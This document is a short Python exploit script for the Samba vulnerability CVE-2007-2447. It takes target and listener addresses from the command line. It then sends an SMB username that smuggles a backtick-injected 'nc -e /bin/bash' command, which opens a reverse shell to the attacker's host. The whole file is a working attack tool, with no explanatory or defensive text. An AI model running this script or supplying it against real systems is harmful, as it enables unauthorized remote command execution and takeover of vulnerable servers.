# Author: Cristhoper Heredia aka ( x0pr4nt3s )
# CVE-2007-2447

from smb.SMBConnection import SMBConnection
import sys

target="" 
target_port=""
lhost=""
lport=""

def help_panel():
    print("Usage :")
    print("python3 cve-2007-2447.py <rhost> <rport> <lhost> <lport>")

try:
    if(len(sys.argv)==5):
        target=sys.argv[1]
        target_port=sys.argv[2]
        lhost=sys.argv[3]
        lport=sys.argv[4]
    else:
        help_panel()
        sys.exit()
except:
    sys.exit()

payload="/=`nohup nc -e /bin/bash "+lhost+" "+lport+ "`"
try:
    conexion=SMBConnection(payload,"","","")
    print('Conectando...')
    conexion.connect(target,int(target_port))
except:
    print("Error...")
